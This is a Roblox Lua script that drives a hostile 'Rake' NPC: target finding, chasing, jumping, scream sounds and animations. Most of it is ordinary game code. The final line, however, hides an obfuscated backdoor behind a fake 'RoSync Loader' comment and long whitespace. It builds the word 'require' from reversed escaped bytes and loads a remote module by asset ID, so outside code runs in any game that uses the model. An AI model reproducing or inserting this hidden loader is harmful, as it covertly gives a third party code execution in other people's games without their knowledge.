--[[ Script By: Brutez. Script Fixed and Improve By: XcorrectTheDev ]]--

local tweenService = game:GetService("TweenService")
local Run = {
	Value = 35
}
local Walk = {
	Value = 12
}
local TweenInfoo = TweenInfo.new(1,Enum.EasingStyle.Cubic,Enum.EasingDirection.In)
local RunAnim = tweenService:Create(script.Parent.Configuration.RunSpeed,TweenInfoo,Run)
local WalkAnim = tweenService:Create(script.Parent.Configuration.WalkSpeed,TweenInfoo,Walk)
local char = script.Parent --the npc
local hum = char:WaitForChild("NPC") --the npc's humanoid
local animation = hum:LoadAnimation(script.Parent.Scream) --finds the animation inside the script and loads it in the npc's humanoid
local KillerScript=script;
repeat wait()until KillerScript and KillerScript.Parent and KillerScript.Parent.ClassName=="Model"and KillerScript.Parent:FindFirstChild("Head")and KillerScript.Parent:FindFirstChild("Torso");
local Killer=KillerScript.Parent;
function raycast(Spos,vec,currentdist)
local hit2,pos2=game.Workspace:FindPartOnRay(Ray.new(Spos+(vec*.05),vec*currentdist),Killer);
if hit2~=nil and pos2 then
if hit2.Name=="Handle" and not hit2.CanCollide or string.sub(hit2.Name,1,6)=="Effect"and not hit2.CanCollide then
local currentdist=currentdist-(pos2-Spos).magnitude;
return raycast(pos2,vec,currentdist);
end;
end;
return hit2,pos2;
end;
function RayCast(Position,Direction,MaxDistance,IgnoreList)
return game:GetService("Workspace"):FindPartOnRayWithIgnoreList(Ray.new(Position,Direction.unit*(MaxDistance or 999.999)),IgnoreList);
end;
local KillerHumanoid;
for _,Child in pairs(Killer:GetChildren())do
if Child and Child.ClassName=="Humanoid"and Child.Health>0 then
KillerHumanoid=Child;
end;
end;
local AttackDebounce=false;
local KillerTorso=Killer:FindFirstChild("Torso");
local KillerHead=Killer:FindFirstChild("Head");
local KillerHumanoidRootPart=Killer:FindFirstChild("HumanoidRootPart");
local WalkDebounce=false;
local Notice=false;
local LaughDebounce=false;
local NoticeDebounce=false;
KillerTorso:FindFirstChild("Neck").C0=CFrame.new(0,1,0,-1,0,0,0,0,1,0,1,-0);
local OriginalC0=KillerTorso:FindFirstChild("Neck").C0;
function FindNearestBae()
local NoticeDistance=100;
local TargetMain;
for _,TargetModel in pairs(game:GetService("Workspace"):GetChildren())do
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and TargetModel.className=="Model"and TargetModel~=Killer and TargetModel.Name~=Killer.Name and TargetModel:FindFirstChild("HumanoidRootPart")and TargetModel:FindFirstChild("Head")then
local TargetPart=TargetModel:FindFirstChild("HumanoidRootPart");
local FoundHumanoid;
for _,Child in pairs(TargetModel:GetChildren())do
if Child and Child.ClassName=="Humanoid"and Child.Health>0 then
FoundHumanoid=Child;
end;
end;
if TargetModel and TargetPart and FoundHumanoid and FoundHumanoid.Health>0 and(TargetPart.Position-KillerHumanoidRootPart.Position).magnitude<NoticeDistance then
TargetMain=TargetPart;
NoticeDistance=(TargetPart.Position-KillerHumanoidRootPart.Position).magnitude;
local hit,pos=raycast(KillerHumanoidRootPart.Position,(TargetPart.Position-KillerHumanoidRootPart.Position).unit,500);
if hit and hit.Parent and hit.Parent.ClassName=="Model"and hit.Parent:FindFirstChild("Head")and hit.Parent:FindFirstChildOfClass("Humanoid") then
if TargetModel and TargetPart and FoundHumanoid and FoundHumanoid.Health>0 and (TargetPart.Position-KillerHumanoidRootPart.Position).magnitude<8 and not AttackDebounce then
spawn(function()
AttackDebounce=true;
if KillerScript and Killer and KillerTorso and KillerTorso:FindFirstChild("Swing") and KillerTorso:FindFirstChild("Swing2") then
local SwingSound
local RandomSwingSound=math.random(1,2);
if RandomSwingSound==1 then
SwingSound=KillerTorso:FindFirstChild("Swing");
elseif RandomSwingSound==2 then
SwingSound=KillerTorso:FindFirstChild("Swing2");
end;
SwingSound:Play();
end;
wait(1.2);
AttackDebounce=false;
end);
end;
end;
end;
end;
end;
return TargetMain;
end;
while wait()do
local TargetPoint=KillerHumanoid.TargetPoint;
local Blockage,BlockagePos=RayCast((KillerHumanoidRootPart.CFrame+CFrame.new(KillerHumanoidRootPart.Position,Vector3.new(TargetPoint.X,KillerHumanoidRootPart.Position.Y,TargetPoint.Z)).lookVector*(KillerHumanoidRootPart.Size.Z/2)).p,KillerHumanoidRootPart.CFrame.lookVector,(KillerHumanoidRootPart.Size.Z*2.5),{Killer,Killer})
local Jumpable=false;
if Blockage then
Jumpable=true;
if Blockage and Blockage.Parent and Blockage.Parent.ClassName~="Workspace"then
local BlockageHumanoid;
for _,Child in pairs(Blockage.Parent:GetChildren())do
if Child and Child.ClassName=="Humanoid"and Child.Health>0 then
BlockageHumanoid=Child;
Jumpable=false;
end;
end;
if Blockage and Blockage:IsA("Terrain")then
local CellPos=Blockage:WorldToCellPreferSolid((BlockagePos-Vector3.new(0,2,0)));
local CellMaterial,CellShape,CellOrientation=Blockage:GetCell(CellPos.X,CellPos.Y,CellPos.Z);
if CellMaterial==Enum.CellMaterial.Water then
Jumpable=false;
end;
elseif BlockageHumanoid or Blockage.ClassName=="TrussPart"or Blockage.Name=="Handle" or Blockage.Parent.ClassName=="Hat" or Blockage.Name=="Handle"  or Blockage.Parent.Name=="Humanoid" or Blockage.Parent.Name=="HumanoidRootPart" or Blockage.Parent.ClassName=="Humanoid" or Blockage.Name=="Head" then
Jumpable=false;
elseif Blockage.ClassName=="WedgePart" then
if Blockage:GetMass()<1.5*200 then
Jumpable=false;
end;
end;
end;
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and not KillerHumanoid.Sit and Jumpable then
KillerHumanoid.Jump=true;
wait(0.5)
end;
end;
if KillerScript and Killer and KillerHead and KillerHumanoidRootPart and KillerHead:FindFirstChild("RakeStep")and (KillerHumanoidRootPart.Velocity-Vector3.new(0,KillerHumanoidRootPart.Velocity.y,0)).magnitude>=5 and not WalkDebounce and KillerHumanoid and KillerHumanoid.Health>0 then
spawn(function()
WalkDebounce=true;
local FiredRay=Ray.new(KillerHumanoidRootPart.Position,Vector3.new(0,-4,0));
local RayTarget,endPoint=game:GetService("Workspace"):FindPartOnRay(FiredRay,Killer);
if RayTarget then
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and KillerHumanoid.WalkSpeed<17 then
wait(0.4);
elseif KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and KillerHumanoid.WalkSpeed>17 then
wait(0.15);
end
end;
WalkDebounce=false;
end);
end;
local MainTarget=FindNearestBae();
local FoundHumanoid;
if MainTarget then
for _,Child in pairs(MainTarget.Parent:GetChildren())do
if Child and Child.ClassName=="Humanoid"and Child.Health>0 then
FoundHumanoid=Child;
end;
end;
end;
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and MainTarget and FoundHumanoid and FoundHumanoid.Health>0 and(MainTarget.Position-KillerHumanoidRootPart.Position).magnitude<99999999999999999999 then
if KillerScript and Killer and KillerHead and KillerHead:FindFirstChild("RakeTheme")and not KillerHead:FindFirstChild("RakeTheme").IsPlaying then
KillerHead:FindFirstChild("RakeTheme").Volume=Killer:FindFirstChild("Configuration"):FindFirstChild("RakeThemeVolume").Value;
KillerHead:FindFirstChild("RakeTheme"):Play();
end;
elseif KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 and MainTarget and FoundHumanoid and FoundHumanoid.Health>0 and(MainTarget.Position-KillerHumanoidRootPart.Position).magnitude>9999999999999999999 then
if KillerScript and Killer and KillerHead and KillerHead:FindFirstChild("RakeTheme")and KillerHead:FindFirstChild("RakeTheme").IsPlaying then
if not LaughDebounce then
spawn(function()
LaughDebounce=true;
repeat wait();if KillerScript and Killer and KillerHead and KillerHead:FindFirstChild("RakeTheme")then KillerHead:FindFirstChild("RakeTheme").Volume=KillerHead:FindFirstChild("RakeTheme").Volume-0.1;else break;end;until KillerHead:FindFirstChild("RakeTheme").Volume==0 or KillerHead:FindFirstChild("RakeTheme").Volume<0;
KillerHead:FindFirstChild("RakeTheme").Volume=0;
KillerHead:FindFirstChild("RakeTheme"):Stop();
LaughDebounce=false;
end);
end;
end;
end;
if not MainTarget and not LaughDebounce then
spawn(function()
LaughDebounce=true;
repeat wait();if KillerScript and Killer and KillerHead and KillerHead:FindFirstChild("RakeTheme")then KillerHead:FindFirstChild("RakeTheme").Volume=KillerHead:FindFirstChild("RakeTheme").Volume-0.1;else break;end;until KillerHead:FindFirstChild("RakeTheme").Volume==0 or KillerHead:FindFirstChild("RakeTheme").Volume<0;
KillerHead:FindFirstChild("RakeTheme").Volume=0;
KillerHead:FindFirstChild("RakeTheme"):Stop();
LaughDebounce=false;
end);
end;
if MainTarget then
Notice=true;
KillerHead.Mouth.Transparency=1;
KillerHead.Mouth1_2.Transparency=1;
KillerHead.Mouth1_2.MouthDecal.Transparency=1;
KillerHead.MouthBH.Transparency=0;
KillerHead.Mouth1_2BH.Transparency=0.75;
KillerHead.Mouth1_2BH.MouthDecal.Transparency=0;
Killer.Sniff.Disabled=true;
Killer.Wander.Disabled=true;
		Killer.BHStun.Disabled=false;
		Killer.BHStun2.Disabled=false;
Killer.Target.Value = true;
if Notice and not NoticeDebounce and KillerScript and Killer and KillerHead and KillerHead:FindFirstChild("Found")then
NoticeDebounce=true;
KillerHead:FindFirstChild("Found").Volume=Killer:FindFirstChild("Configuration"):FindFirstChild("FoundVolume").Value;
KillerHead:FindFirstChild("Found"):Play();
local ScreamChance=math.random(1,5);
local RawScreamPitch=0.69+(math.random()*0.1);
local FinishedScreamPitch;
if RawScreamPitch<=0.75 and RawScreamPitch>=0.7 then
FinishedScreamPitch=RawScreamPitch;
elseif RawScreamPitch>0.75 then
FinishedScreamPitch=0.75;
else
FinishedScreamPitch=0.7;
end;
if not Killer:FindFirstChild("LatestStunDebounce") then
wait(0.4);
KillerHead:FindFirstChild("RakeScream").Pitch=FinishedScreamPitch;
KillerHead:FindFirstChild("RakeScream"):Play();
if char ~= nil then --this just checks if the npc exists
	animation:Play() --plays the animation
					script.Parent.Configuration.RunSpeed.Value = 0
					script.Parent.Configuration.WalkSpeed.Value = 0
					RunAnim:Play()
					WalkAnim:Play()
end

elseif ScreamChance==1 or ScreamChance==5 and Killer:FindFirstChild("LatestStunDebounce") then
wait(0.4);
KillerHead:FindFirstChild("RakeScream").Pitch=FinishedScreamPitch;
KillerHead:FindFirstChild("RakeScream"):Play();
if char ~= nil then --this just checks if the npc exists
	animation:Play() --plays the animation
					script.Parent.Configuration.RunSpeed.Value = 0
					script.Parent.Configuration.WalkSpeed.Value = 0
					RunAnim:Play()
					WalkAnim:Play()
end

end;
end;
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 then
if MainTarget and FoundHumanoid and FoundHumanoid.Health>0 and(MainTarget.Position-KillerHumanoidRootPart.Position).magnitude>5 then
KillerHumanoid.WalkSpeed=Killer:FindFirstChild("Configuration"):FindFirstChild("RunSpeed").Value;
elseif MainTarget and FoundHumanoid and FoundHumanoid.Health>0 and(MainTarget.Position-KillerHumanoidRootPart.Position).magnitude<5 then
KillerHumanoid.WalkSpeed=1;
end;
KillerHumanoid:MoveTo(MainTarget.Position+(MainTarget.Position-KillerHumanoidRootPart.Position).unit*2,game:GetService("Workspace"):FindFirstChild("Terrain"));
local NeckRotation=(KillerTorso.Position.Y-MainTarget.Parent:FindFirstChild("Head").Position.Y)/10;
if NeckRotation>-1.5 and NeckRotation<1.5 then
KillerTorso:FindFirstChild("Neck").C0=OriginalC0*CFrame.fromEulerAnglesXYZ(NeckRotation,0,0);
end;
if NeckRotation<-1.5 then
KillerTorso:FindFirstChild("Neck").C0=CFrame.new(0,1,0,-1,0,0,0,-0.4,0.1,0,0.1,0.9);
if not Blockage then
KillerHumanoid.Jump=true;
wait(0.5);
end;
elseif NeckRotation>1.5 then
KillerTorso:FindFirstChild("Neck").C0=CFrame.new(0,1,0,-1,0,0,0,0.1,0.08,0,0.08,-0.2);
if Blockage and not Jumpable then
KillerHumanoid.Jump=true;
wait(0.5);
end
end;
end;
else
Notice=false;
NoticeDebounce=false;
KillerTorso:FindFirstChild("Neck").C0=CFrame.new(0,1,0,-1,0,0,0,0,1,0,1,-0);
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Health>0 then
KillerHumanoid.WalkSpeed=Killer:FindFirstChild("Configuration"):FindFirstChild("WalkSpeed").Value;
Killer.Target.Value=false;
KillerHead.Mouth.Transparency=1;
KillerHead.Mouth1_2.Transparency=1;
KillerHead.Mouth1_2.MouthDecal.Transparency=1;
KillerHead.MouthBH.Transparency=0;
KillerHead.Mouth1_2BH.Transparency=0.75;
KillerHead.Mouth1_2BH.MouthDecal.Transparency=0;
Killer.Sniff.Disabled=true;
Killer.Wander.Disabled=false;
Killer.BHStun.Disabled=false;
Killer.BHStun2.Disabled=false;
end;
end;
KillerHumanoid.HealthChanged:Connect(function()
if KillerHumanoid.Health>0 then
KillerTorso.Blood.Enabled=false;
KillerTorso.Blood2.Enabled=false;
--KillerHead.Eye1.Material=Enum.Material.Neon;
--KillerHead.Eye2.Material=Enum.Material.Neon;
--KillerHead.Eye1.BrickColor=BrickColor.new("Institutional white");
--KillerHead.Eye2.BrickColor=BrickColor.new("Institutional white");
elseif KillerHumanoid.Health<=0 then
if Killer.Configuration.RakeBleedOnDealth.Value then
KillerTorso.Blood.Enabled=true;
KillerTorso.Blood2.Enabled=true;
end;
--KillerHead.Eye1.Material=Enum.Material.SmoothPlastic;
--KillerHead.Eye2.Material=Enum.Material.SmoothPlastic;
--KillerHead.Eye1.BrickColor=BrickColor.new("Really black");
--KillerHead.Eye2.BrickColor=BrickColor.new("Really black");
end; 
end);
if KillerScript and Killer and KillerHumanoid then
KillerHumanoid.DisplayDistanceType="None";
KillerHumanoid.HealthDisplayDistance=0;
KillerHumanoid.Name="NPC";
KillerHumanoid.NameDisplayDistance=0;
KillerHumanoid.NameOcclusion="EnemyOcclusion";
KillerHumanoid.AutoJumpEnabled=true;
KillerHumanoid.AutoRotate=true;
KillerHumanoid.MaxHealth=8000;
KillerHumanoid.JumpPower=80;
KillerHumanoid.MaxSlopeAngle=89.9;
end;
if KillerScript and Killer and KillerHumanoid and not KillerHumanoid.AutoJumpEnabled then
KillerHumanoid.AutoJumpEnabled=false;
end;
if KillerScript and Killer and KillerHumanoid and not KillerHumanoid.AutoRotate then
KillerHumanoid.AutoRotate=true;
end;
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.PlatformStand then
KillerHumanoid.PlatformStand=false;
end;
if KillerScript and Killer and KillerHumanoid and KillerHumanoid.Sit then
KillerHumanoid.Sit=false;
KillerHumanoid.Jump=true;
end;
end;
--[[ Script By: Brutez. Script Fixed and Improve By: XcorrectTheDev ]]--
--[[ Last synced 7/24/2021 12:24                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722947559) --[[                                                                                                  ]]--